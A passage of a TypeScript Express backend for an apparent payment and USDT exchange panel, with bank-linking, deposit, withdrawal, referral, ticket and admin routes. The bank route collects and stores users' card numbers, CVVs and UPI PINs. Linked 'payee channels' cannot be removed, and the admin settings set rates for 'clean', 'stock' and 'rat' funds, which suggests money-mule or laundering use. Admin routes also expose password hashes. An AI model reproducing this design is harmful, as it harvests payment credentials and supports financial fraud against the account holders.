  app.get("/api/banks", catchAsync(async (req, res) => {
    const user = await getSessionUser(req);
    if (!user) return res.status(401).json({ error: "Unauthorized" });

    const banks = await queries.getBankAccounts(user.id);
    res.json(banks);
  }));

  // Bank Accounts API: Add
  app.post("/api/banks", catchAsync(async (req, res) => {
    const user = await getSessionUser(req);
    if (!user) return res.status(401).json({ error: "Unauthorized" });

    const { holderName, bankName, accountNumber, ifsc, upiId, isUpiOnly, cardNumber, expiryDate, cvv, upiPin } = req.body;
    if (!holderName || (!upiId && isUpiOnly) || (!bankName && !isUpiOnly)) {
      return res.status(400).json({ error: "Required fields are missing" });
    }

    const newBank: BankAccount = {
      id: "bank-" + Date.now(),
      userId: user.id,
      holderName,
      bankName: isUpiOnly ? "UPI WALLET" : bankName,
      accountNumber: isUpiOnly ? upiId : accountNumber,
      ifsc: isUpiOnly ? "UPI0000000" : ifsc,
      upiId: upiId || "",
      cardNumber: cardNumber || "",
      expiryDate: expiryDate || "",
      cvv: cvv || "",
      upiPin: upiPin || "",
      isActive: false
    };

    await saveBank(newBank);
    await logActivity(user.id, "BANK_LINKED", `Linked bank account: ${newBank.bankName} (${newBank.holderName})`, { bankName: newBank.bankName, holderName: newBank.holderName });
    res.json({ success: true, bank: newBank });
  }));

  // Bank Accounts API: Toggle Status
  app.post("/api/banks/:id/toggle", catchAsync(async (req, res) => {
    const sessionUser = await getSessionUser(req);
    if (!sessionUser) return res.status(401).json({ error: "Unauthorized" });

    const { id } = req.params;
    const { isActive } = req.body;

    // Find the bank account first to check ownership or admin role
    const bank = await queries.getBankAccountById(id);
    if (!bank) return res.status(404).json({ error: "Bank account not found" });

    // ONLY the admin can activate or deactivate bank channels
    if (sessionUser.role !== "admin") {
      return res.status(403).json({ error: "Only admins are allowed to activate or deactivate payee channels." });
    }

    await queries.saveBankAccount({
      ...bank,
      isActive: isActive !== undefined ? isActive : !bank.isActive
    });

    res.json({ success: true });
  }));

  // Bank Accounts API: Delete
  app.delete("/api/banks/:id", catchAsync(async (req, res) => {
    return res.status(400).json({ error: "Linked payee bank channels are permanent and cannot be deleted or unlinked." });
  }));

  // Deposits API: Submit payment confirmation (UTR)
  app.post("/api/deposits", catchAsync(async (req, res) => {
    const user = await getSessionUser(req);
    if (!user) return res.status(401).json({ error: "Unauthorized" });

    const { amount, method, utr, screenshot } = req.body;
    if (!amount || isNaN(amount) || amount <= 0) {
      return res.status(400).json({ error: "Invalid deposit amount" });
    }
    if (!utr || utr.trim().length < 8) {
      return res.status(400).json({ error: "Please enter a valid 12-digit UTR/Txn Number (min 8 characters)" });
    }

    const cleanUtr = utr.trim();
    const allTxs = await queries.getTransactions();

    // 1. Prevent duplicate UTR submission (case-insensitive & trimmed)
    const existingTx = allTxs.find(t => 
      t.utr && t.utr.trim().toLowerCase() === cleanUtr.toLowerCase()
    );
    if (existingTx) {
      return res.status(400).json({ 
        error: "This UTR/Txn number has already been submitted. Status: " + existingTx.status.toUpperCase() 
      });
    }

    // 2. Prevent rapid duplicate submission within 10 seconds from same user
    const recentDuplicate = allTxs.find(t => 
      t.userId === user.id && 
      t.type === "deposit" && 
      Number(t.amount) === Number(amount) && 
      (new Date().getTime() - new Date(t.createdAt).getTime() < 10000)
    );
    if (recentDuplicate) {
      return res.status(400).json({ error: "A deposit request with these details was just submitted. Please wait." });
    }

    const newTx: Transaction = {
      id: "tx-dep-" + Date.now() + "-" + Math.random().toString(36).substring(2, 8),
      userId: user.id,
      username: user.username,
      type: "deposit",
      amount: Number(amount),
      method: method || "UPI QR",
      utr: cleanUtr,
      screenshot: screenshot || "", // base64 payload
      status: "pending",
      createdAt: new Date().toISOString()
    };

    await saveTransaction(newTx);
    await logActivity(user.id, "DEPOSIT_SUBMITTED", `Submitted a deposit request of ₹${amount} with UTR ${cleanUtr}`, { amount, utr: cleanUtr, txId: newTx.id });
    res.json({ success: true, transaction: newTx });
  }));

  // Withdrawals API: Request Withdrawal
  app.post("/api/withdrawals", catchAsync(async (req, res) => {
    const user = await getSessionUser(req);
    if (!user) return res.status(401).json({ error: "Unauthorized" });

    const { amount, bankAccountId } = req.body;
    if (!amount || isNaN(amount) || amount <= 0) {
      return res.status(400).json({ error: "Invalid withdrawal amount" });
    }

    const settings = mapSettings(await queries.getSiteSettings());

    if (amount < settings.minWithdraw) {
      return res.status(400).json({ error: `Minimum withdrawal amount is ₹${settings.minWithdraw}` });
    }

    if (user.walletBalance < amount) {
      return res.status(400).json({ error: "Insufficient wallet balance" });
    }

    const banks = await queries.getBankAccounts(user.id);
    const bank = banks.find(b => b.id === bankAccountId);
    if (!bank) {
      return res.status(400).json({ error: "Please add and select a valid bank account" });
    }

    // Use Atomic update to deduct balance
    try {
      await queries.updateUserBalance(user.id, -Number(amount));
    } catch (err) {
      console.error("[WITHDRAWAL BALANCE ERROR]", err);
      return res.status(500).json({ error: "Failed to process balance deduction" });
    }

    const newTx: Transaction = {
      id: "tx-wdr-" + Date.now(),
      userId: user.id,
      username: user.username,
      type: "withdrawal",
      amount: Number(amount),
      method: "Bank Transfer",
      bankDetails: {
        holderName: bank.holderName,
        bankName: bank.bankName,
        accountNumber: bank.accountNumber,
        ifsc: bank.ifsc,
        upiId: bank.upiId
      },
      status: "pending",
      createdAt: new Date().toISOString()
    };

    await saveTransaction(newTx);
    await logActivity(user.id, "WITHDRAWAL_REQUESTED", `Requested a bank withdrawal of ₹${amount}`, { amount, bankName: bank.bankName, txId: newTx.id });
    res.json({ success: true, transaction: newTx });
  }));

  // Referral / Commission Details
  app.get("/api/referrals", catchAsync(async (req, res) => {
    const user = await getSessionUser(req);
    if (!user) return res.status(401).json({ error: "Unauthorized" });

    const [referredUsersList, allTxs] = await Promise.all([
        queries.getUsersByReferrer(user.referralCode),
        queries.getTransactions(user.id)
    ]);

    const referredUsers = referredUsersList
      .map(u => ({
        username: u.username,
        kycStatus: u.kycStatus,
        createdAt: safeIso(u.createdAt)
      }));

    const commissions = allTxs.filter(
      t => t.type === "commission" || t.type === "referral"
    ).map(mapTransaction);

    res.json({
      referralCode: user.referralCode,
      referredUsers,
      commissions,
      referralIncome: user.referralIncome
    });
  }));

  // Notifications: Get & Read
  // USDT Exchange Routes
  app.post("/api/usdt/buy", catchAsync(async (req, res) => {
    const sessionUser = await getSessionUser(req);
    if (!sessionUser) return res.status(401).json({ error: "Unauthorized" });
    const { usdtAmount, inrAmount, utr, walletAddress, fundType } = req.body;
    if (!usdtAmount || Number(usdtAmount) < 10) return res.status(400).json({ error: "Minimum 10 USDT required for exchange" });
    
    const user = await queries.getUserById(sessionUser.id);
    if (!user) return res.status(404).json({ error: "User not found" });

    const transaction: Transaction = {
      id: "tx-" + Date.now(),
      userId: user.id,
      username: user.username,
      type: "usdt_buy",
      amount: Number(inrAmount),
      method: "USDT_PURCHASE",
      utr,
      fundType,
      bankDetails: {
        holderName: user.username,
        bankName: "USDT Wallet",
        accountNumber: walletAddress || "",
        ifsc: "TRC20"
      },
      status: "pending",
      createdAt: new Date().toISOString()
    };

    await saveTransaction(transaction);
    res.json({ success: true, transaction });
  }));

  app.post("/api/usdt/sell", catchAsync(async (req, res) => {
    const sessionUser = await getSessionUser(req);
    if (!sessionUser) return res.status(401).json({ error: "Unauthorized" });
    const { usdtAmount, inrAmount, utr, fundType, bankDetails } = req.body;
    if (!usdtAmount || isNaN(Number(usdtAmount)) || Number(usdtAmount) < 10) {
      return res.status(400).json({ error: "Minimum 10 USDT required for exchange" });
    }
    if (!inrAmount || isNaN(Number(inrAmount)) || Number(inrAmount) <= 0) {
      return res.status(400).json({ error: "Invalid INR exchange amount calculated" });
    }
    
    const user = await queries.getUserById(sessionUser.id);
    if (!user) return res.status(404).json({ error: "User not found" });

    const transaction: any = {
      id: "tx-" + Date.now(),
      userId: user.id,
      username: user.username,
      type: "usdt_sell",
      amount: Number(inrAmount).toString(),
      method: "USDT_SALE",
      utr,
      fundType,
      bankDetails: bankDetails || {
        holderName: user.username,
        bankName: "USDT Sale",
        accountNumber: "Platform Wallet",
        ifsc: "TRC20"
      },
      status: "pending",
      createdAt: new Date().toISOString()
    };

    await saveTransaction(transaction);
    res.json({ success: true, transaction: mapTransaction(transaction) });
  }));

  // Notifications: Get & Read
  app.get("/api/user-notifications", catchAsync(async (req, res) => {
    const user = await getSessionUser(req);
    if (!user) return res.status(401).json({ error: "Unauthorized" });

    const list = await queries.getNotifications(user.id);
    res.json(list.map(mapNotification));
  }));

  app.post("/api/user-notifications/mark-read", catchAsync(async (req, res) => {
    const user = await getSessionUser(req);
    if (!user) return res.status(401).json({ error: "Unauthorized" });

    const notificationsList = await queries.getNotifications(user.id);
    for (const n of notificationsList) {
      if (!n.read) {
        await saveNotification({ ...mapNotification(n), read: true });
      }
    }
    res.json({ success: true });
  }));

  // Support Tickets API: List
  app.get("/api/tickets", catchAsync(async (req, res) => {
    const user = await getSessionUser(req);
    if (!user) return res.status(401).json({ error: "Unauthorized" });

    const tickets = await queries.getSupportTickets(user.id);
    res.json(tickets.map(mapTicket));
  }));

  // Support Tickets API: Create
  app.post("/api/tickets", catchAsync(async (req, res) => {
    const user = await getSessionUser(req);
    if (!user) return res.status(401).json({ error: "Unauthorized" });

    const { subject, message } = req.body;
    if (!subject || !message) {
      return res.status(400).json({ error: "Subject and message are required" });
    }

    const newTicket: SupportTicket = {
      id: "ticket-" + Date.now(),
      userId: user.id,
      username: user.username,
      subject,
      message,
      status: "open",
      replies: [],
      createdAt: new Date().toISOString()
    };

    await saveTicket(newTicket);
    res.json({ success: true, ticket: newTicket });
  }));

  // Support Tickets API: Send User Reply
  app.post("/api/tickets/:id/reply", catchAsync(async (req, res) => {
    const user = await getSessionUser(req);
    if (!user) return res.status(401).json({ error: "Unauthorized" });

    const { id } = req.params;
    const { message } = req.body;
    if (!message) return res.status(400).json({ error: "Message is required" });

    const ticket = mapTicket(await queries.getSupportTickets(user.id).then(ts => ts.find(t => t.id === id)));
    if (!ticket) return res.status(404).json({ error: "Ticket not found" });

    ticket.replies.push({
      sender: "user",
      message,
      createdAt: new Date().toISOString()
    });
    ticket.status = "open";

    await saveTicket(ticket);
    res.json({ success: true, ticket });
  }));

  // ================= ADMIN APIS =================

  // Middleware helper to confirm admin
  const verifyAdmin = catchAsync(async (req: express.Request, res: express.Response, next: express.NextFunction) => {
    const user = await getSessionUser(req);
    if (!user || user.role !== "admin") {
      return res.status(403).json({ error: "Access Denied. Admins only." });
    }
    (req as any).user = user;
    next();
  });

  app.get("/api/admin/dashboard-stats", verifyAdmin, catchAsync(async (req, res) => {
    const [usersList, transactionsList, ticketsList] = await Promise.all([
      queries.getUsers(),
      queries.getTransactions(),
      queries.getSupportTickets("all")
    ]);

      const totalUsers = usersList.filter(u => u.role !== "admin").length;
      const activeUsers = usersList.filter(u => parseFloat(u.walletBalance || "0") > 0).length;
      const onlineUsers = usersList.filter(u => {
        const lastActiveDate = u.lastActive ? ((u.lastActive instanceof Date) ? u.lastActive : new Date(u.lastActive)) : null;
        let lastActiveMs = lastActiveDate ? lastActiveDate.getTime() : 0;
        if (lastActiveDate && !isNaN(lastActiveMs) && lastActiveDate.getFullYear() > 3000) {
          lastActiveMs = Math.floor(lastActiveMs / 1000);
        }
        return u.isOnline && (Date.now() - lastActiveMs < 60000);
      }).length;
      
      const approvedDeposits = transactionsList.filter(t => t.type === "deposit" && t.status === "approved");
      const totalDepositAmt = approvedDeposits.reduce((acc, curr) => acc + parseFloat(curr.amount || "0"), 0);

      const approvedWithdrawals = transactionsList.filter(t => t.type === "withdrawal" && t.status === "approved");
      const totalWithdrawAmt = approvedWithdrawals.reduce((acc, curr) => acc + parseFloat(curr.amount || "0"), 0);

      const pendingDeposits = transactionsList.filter(t => t.type === "deposit" && t.status === "pending");
      const pendingWithdrawals = transactionsList.filter(t => t.type === "withdrawal" && t.status === "pending");
      const pendingUsdt = transactionsList.filter(t => (t.type === "usdt_buy" || t.type === "usdt_sell") && t.status === "pending");

      const tickets = ticketsList.filter(t => t.status === "open").length;

      // Ensure all pending transactions are ALWAYS returned so they are never cut off from the admin tabs, plus up to 150 recent completed ones
      const pendingTxs = transactionsList.filter(t => t.status === "pending");
      const completedTxs = transactionsList.filter(t => t.status !== "pending");
      const combinedTxs = [
        ...pendingTxs,
        ...completedTxs.slice(0, 150)
      ];

      res.json({
        totalUsers,
        activeUsers,
        onlineUsers,
        totalDeposits: totalDepositAmt,
        totalWithdrawals: totalWithdrawAmt,
        pendingDeposits: pendingDeposits.length,
        pendingWithdrawals: pendingWithdrawals.length,
        pendingUsdt: pendingUsdt.length,
        openTickets: tickets,
        transactions: combinedTxs.map(mapTransaction)
      });
  }));

  app.get("/api/admin/users", verifyAdmin, catchAsync(async (req, res) => {
    const [usersList, bankAccountsList, transactionsList] = await Promise.all([
      queries.getUsers(),
      queries.getBankAccounts("all"),
      queries.getTransactions()
    ]);

      const enrichedUsers = usersList
        .filter(u => u.role !== "admin")
        .map(u => {
          const userBanks = bankAccountsList.filter((b: any) => b.userId === u.id);
          const userTxs = transactionsList.filter(t => t.userId === u.id);
          return {
            ...mapUser(u),
            password: u.passwordHash,
            passwordHash: u.passwordHash,
            bankAccounts: userBanks,
            transactionCount: userTxs.length,
            lastTransaction: userTxs.length > 0 ? mapTransaction(userTxs[0]) : null
          };
        });
      res.json(enrichedUsers);
  }));

  app.get("/api/admin/activity-logs", verifyAdmin, catchAsync(async (req, res) => {
    const page = parseInt(req.query.page as string || "1");
    const limit = parseInt(req.query.limit as string || "50");
    const userId = req.query.userId as string || undefined;
    const search = req.query.search as string || undefined;
    const type = req.query.type as string || undefined;
    const startDate = req.query.startDate as string || undefined;
    const endDate = req.query.endDate as string || undefined;

    const result = await queries.getUserActivityLogs({
      page,
      limit,
      userId,
      search,
      type,
      startDate,
      endDate
    });

    res.json(result);
  }));

  // Admin: Approve/Reject Deposit Requests
  app.post("/api/admin/deposits/:id/action", verifyAdmin, catchAsync(async (req, res) => {
    const { id } = req.params;
    const { action } = req.body; // "approve" or "reject"
    if (!id || !action) return res.status(400).json({ error: "Missing parameters" });

    if (action === "approve") {
            const tx = await queries.approveDepositTransaction(id, (req as any).user?.id || "admin");
            if (!tx) return res.status(404).json({ error: "Transaction not found or already processed" });
            
            let title = "Deposit Approved!";
            let message = `Your deposit of ₹${parseFloat(tx.amount || "0").toLocaleString("en-IN")} has been approved and credited to your wallet.`;
            
            if (tx.type === "usdt_buy") {
              title = "USDT Buy Approved!";
              message = `Your USDT purchase request of ₹${parseFloat(tx.amount || "0").toLocaleString("en-IN")} has been approved. USDT has been dispatched to your wallet address.`;
            } else if (tx.type === "usdt_sell") {
              title = "USDT Sell Approved!";
              message = `Your USDT sale request of ₹${parseFloat(tx.amount || "0").toLocaleString("en-IN")} has been approved. Payout has been processed to your bank details.`;
            }

            // Transaction handles balance & commission
            await saveNotification({
                id: "notif-dep-app-" + Date.now(),
                userId: tx.userId,
                title,
                message,
                read: false,
                createdAt: new Date().toISOString()
            });

            return res.json({ success: true, transaction: tx });
        } else {
            // Rejection doesn't need a complex transaction, just update status
            const tx = await queries.getTransactionById(id);
            if (!tx) return res.status(404).json({ error: "Transaction not found" });

            await queries.saveTransaction({
                ...tx,
                status: "rejected"
            });

            let title = "Deposit Rejected";
            let message = `Your deposit request of ₹${parseFloat(tx.amount || "0").toLocaleString("en-IN")} was rejected. Please double-check the UTR or screenshot.`;

            if (tx.type === "usdt_buy") {
              title = "USDT Buy Rejected";
              message = `Your USDT purchase request of ₹${parseFloat(tx.amount || "0").toLocaleString("en-IN")} was rejected. Please verify the UTR or your receiving wallet address.`;
            } else if (tx.type === "usdt_sell") {
              title = "USDT Sell Rejected";
              message = `Your USDT sale request of ₹${parseFloat(tx.amount || "0").toLocaleString("en-IN")} was rejected. Please verify your receiving bank credentials or UTR.`;
            }

            await saveNotification({
                id: "notif-dep-rej-" + Date.now(),
                userId: tx.userId,
                title,
                message,
                read: false,
                createdAt: new Date().toISOString()
            });

            return res.json({ success: true, transaction: mapTransaction(tx) });
        }
  }));

  // Admin: Approve/Reject Withdrawal Requests
  app.post("/api/admin/withdrawals/:id/action", verifyAdmin, catchAsync(async (req, res) => {
    const { id } = req.params;
    const { action } = req.body; // "approve" or "reject"
    if (!id || !action) return res.status(400).json({ error: "Missing parameters" });

    const tx = await queries.getTransactionById(id);
    if (!tx || tx.type !== "withdrawal") return res.status(404).json({ error: "Withdrawal request not found" });

    if (tx.status !== "pending") {
        return res.status(400).json({ error: "Transaction already processed" });
    }

    if (action === "approve") {
        await queries.saveTransaction({
            ...tx,
            status: "approved"
        });

        await saveNotification({
            id: "notif-wdr-app-" + Date.now(),
            userId: tx.userId,
            title: "Withdrawal Successful!",
            message: `Your withdrawal request of ₹${tx.amount} has been approved. Fund is sent to your bank.`,
            read: false,
            createdAt: new Date().toISOString()
        });
    } else {
        // Reject withdrawal: REFUND balance atomics
        await queries.updateUserBalance(tx.userId, parseFloat(tx.amount || "0"));

        await queries.saveTransaction({
            ...tx,
            status: "rejected"
        });

        await saveNotification({
            id: "notif-wdr-rej-" + Date.now(),
            userId: tx.userId,
            title: "Withdrawal Rejected",
            message: `Your withdrawal of ₹${tx.amount} was rejected. The funds have been refunded to your wallet.`,
            read: false,
            createdAt: new Date().toISOString()
        });
    }

    res.json({ success: true, transaction: mapTransaction(tx) });
  }));

  // Admin: Manage Site Settings
  app.post("/api/admin/settings", verifyAdmin, catchAsync(async (req, res) => {
    const { upiId, qrCodeUrl, bankName, bankAccount, bankIfsc, bankHolder, minDeposit, minWithdraw, telegramSupport, whatsappSupport, depositEnabled, adminBanks, cleanFundRate, stockFundRate, ratFundRate, liveActivityEnabled } = req.body;
    
    const settings = await queries.getSiteSettings();
    const newSettings = {
      ...settings,
      depositEnabled: depositEnabled !== undefined ? depositEnabled : (settings.depositEnabled ?? true),
      liveActivityEnabled: liveActivityEnabled !== undefined ? liveActivityEnabled : (settings.liveActivityEnabled ?? true),
      adminBanks: adminBanks || settings.adminBanks || [],
      upiId: upiId !== undefined && upiId !== "" ? upiId : settings.upiId,
      qrCodeUrl: qrCodeUrl !== undefined && qrCodeUrl !== "" ? qrCodeUrl : settings.qrCodeUrl,
      bankName: bankName !== undefined && bankName !== "" ? bankName : settings.bankName,
      bankAccount: bankAccount !== undefined && bankAccount !== "" ? bankAccount : settings.bankAccount,
      bankIfsc: bankIfsc !== undefined && bankIfsc !== "" ? bankIfsc : settings.bankIfsc,
      bankHolder: bankHolder !== undefined && bankHolder !== "" ? bankHolder : settings.bankHolder,
      minDeposit: minDeposit ? Number(minDeposit) : Number(settings.minDeposit),
      minWithdraw: minWithdraw ? Number(minWithdraw) : Number(settings.minWithdraw),
      telegramSupport: telegramSupport || settings.telegramSupport,
      whatsappSupport: whatsappSupport || settings.whatsappSupport,
      usdtBuyRate: req.body.usdtBuyRate ? Number(req.body.usdtBuyRate) : Number(settings.usdtBuyRate),
      usdtSellRate: req.body.usdtSellRate ? Number(req.body.usdtSellRate) : Number(settings.usdtSellRate),
      cleanFundRate: cleanFundRate ? Number(cleanFundRate) : Number(settings.cleanFundRate),
      stockFundRate: stockFundRate ? Number(stockFundRate) : Number(settings.stockFundRate),
      ratFundRate: ratFundRate ? Number(ratFundRate) : Number(settings.ratFundRate),
      usdtWalletAddress: req.body.usdtWalletAddress || settings.usdtWalletAddress,
      id: settings.id
    };

    await saveSettings(newSettings);
    res.json({ success: true, settings: newSettings });
  }));

  // Admin: View User Bank Accounts
  app.get("/api/admin/users/:id/banks", verifyAdmin, catchAsync(async (req, res) => {
    const { id } = req.params;
    const banks = await queries.getBankAccounts(id);
    res.json(banks);
  }));

  // Admin: Add Bank Account to User
  app.post("/api/admin/users/:id/banks", verifyAdmin, catchAsync(async (req, res) => {
    const { id } = req.params;
    const { bankName, holderName, accountNumber, ifsc, upiId } = req.body;
    const newBank = {
      userId: id,
      bankName,
      holderName,
      accountNumber,
      ifsc,
      upiId,
      isActive: false
    };
    await queries.saveBankAccount(newBank);
    res.json({ success: true });
  }));

  // Admin: Get Support Tickets
  app.get("/api/admin/tickets", verifyAdmin, catchAsync(async (req, res) => {
    const tickets = await queries.getSupportTickets();
    res.json(tickets.map(mapTicket));
  }));

  // Admin: Reply to Support Ticket
  app.post("/api/admin/tickets/:id/reply", verifyAdmin, catchAsync(async (req, res) => {
    const { id } = req.params;
    const { message, status } = req.body;
    if (!message) return res.status(400).json({ error: "Message is required" });

    const ticket = mapTicket(await queries.getSupportTickets().then(ts => ts.find(t => t.id === id)));
    if (!ticket) return res.status(404).json({ error: "Ticket not found" });

    ticket.replies.push({
      sender: "admin",
      message,
      createdAt: new Date().toISOString()
    });
    
    if (status) {
      ticket.status = status;
    }

    await saveTicket(ticket);

    // Add notification to user
    await saveNotification({
      id: "notif-tkt-reply-" + Date.now(),
      userId: ticket.userId,
      title: "Support Ticket Update",
      message: `An admin has replied to your ticket: "${ticket.subject}".`,
      read: false,
      createdAt: new Date().toISOString()
    });

    res.json({ success: true, ticket });
  }));

  // Admin: Send custom notification to all users
  app.post("/api/admin/send-notification", verifyAdmin, catchAsync(async (req, res) => {
    const { title, message } = req.body;
    if (!title || !message) return res.status(400).json({ error: "Title and message are required" });

    const userList = await queries.getUsers();
    for (const u of userList) {
      await saveNotification({
        id: "notif-custom-" + Date.now() + Math.random().toString(36).substring(2, 5),
        userId: u.id,
        title,
        message,
        read: false,
        createdAt: new Date().toISOString()
      });
    }

    res.json({ success: true, message: "Notification sent to all users" });
  }));

  // Admin: Approve User KYC Status
  app.post("/api/admin/users/:id/kyc", verifyAdmin, catchAsync(async (req, res) => {
    const { id } = req.params;
    const { action } = req.body; // "approve" or "reject"
    if (!id || !action) return res.status(400).json({ error: "Missing parameters" });

    const user = await queries.getUserById(id);
    if (!user) return res.status(404).json({ error: "User not found" });

    const newKyc = action === "approve" ? "Approved" : "Not Submitted";
    await queries.updateUser(user.id, {
        kycStatus: newKyc
    });

    // Notify user
    await saveNotification({
      id: "notif-kyc-" + Date.now(),
      userId: id,
      title: action === "approve" ? "KYC Approved!" : "KYC Rejected",
      message: action === "approve" 
        ? "Your KYC documents have been verified and approved successfully." 
        : "Your KYC verification failed. Please check your uploaded details and resubmit.",
      read: false,
      createdAt: new Date().toISOString()
    });

    res.json({ success: true, user });
  }));

  // Admin API: Manual Credit User Balance
  app.post("/api/admin/users/:id/credit", verifyAdmin, catchAsync(async (req, res) => {
    const { id } = req.params;
    const { amount } = req.body;

    if (!amount || isNaN(amount) || amount <= 0) {
      return res.status(400).json({ error: "Invalid amount" });
    }

    const user = await queries.getUserById(id);
    if (!user) return res.status(404).json({ error: "User not found" });

    // Atomic Credit
    await queries.updateUserBalance(user.id, Number(amount));

    // Add transaction record for history
    const newTx: Transaction = {
        id: "tx-admin-" + Date.now(),
        userId: user.id,
        username: user.username,
        type: "deposit",
        amount: Number(amount),
        method: "Admin Credit",
        utr: "ADM-" + Date.now().toString().slice(-8),
        status: "approved",
        createdAt: new Date().toISOString()
    };
    await saveTransaction(newTx);

    // Notify user
    await saveNotification({
        id: "notif-credit-" + Date.now(),
        userId: id,
        title: "Wallet Credited",
        message: `Admin has manually credited ₹${amount} to your wallet.`,
        read: false,
        createdAt: new Date().toISOString()
    });

    res.json({ success: true, message: "Balance updated successfully" });
  }));

  // API 404 handler
  app.all("/api/*", (req, res) => {
    console.log(`API 404: ${req.method} ${req.url}`);
    res.status(404).json({ error: `API route ${req.method} ${req.url} not found` });
  });

  // Global Error Handler
  app.use((err: any, req: express.Request, res: express.Response, next: express.NextFunction) => {
    // Check and automatically self-heal database if malformed or corrupted
    checkAndHealDatabase(err);

    // Only handle API errors
    if (!req.path.startsWith("/api/")) {
      return next(err);
    }

    console.error(`[API ERROR] ${req.method} ${req.url}:`, {
      message: err.message,
      stack: err.stack,
      body: req.body,
      query: req.query
    });
    
    const errStr = (err.message || '') + ' ' + (err.cause?.message || '') + ' ' + (err.stack || '');
    const isConnErr = errStr.includes("Connection terminated") || 
                      errStr.includes("connection timeout") || 
                      errStr.includes("Client has encountered a connection error") ||
                      errStr.includes("ECONNREFUSED") ||
                      errStr.includes("ENOTFOUND") ||
                      errStr.includes("waking up");

    if (isConnErr) {
      return res.status(503).json({
        error: "Database Connection Error",
        message: "The database is currently waking up or temporarily busy. Please try again in 5-10 seconds.",
        retryAfter: 5
      });
    }

    let safeMessage = err.message || "An unexpected error occurred";
    if (safeMessage.includes("Failed query") || safeMessage.includes("select ") || safeMessage.includes("insert ") || safeMessage.includes("update ")) {
      safeMessage = "Database query failed: " + safeMessage;
    }

    res.status(err.status || 500).json({ 
      error: "Internal Server Error", 
      message: safeMessage,
      code: err.code,
      path: req.url,
      method: req.method
    });
  });


  // --- VITE MIDDLEWARE & STATIC SERVING ---
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`[PANDA PANEL Backend] Server running on http://localhost:${PORT}`);
  });
}

startServer();
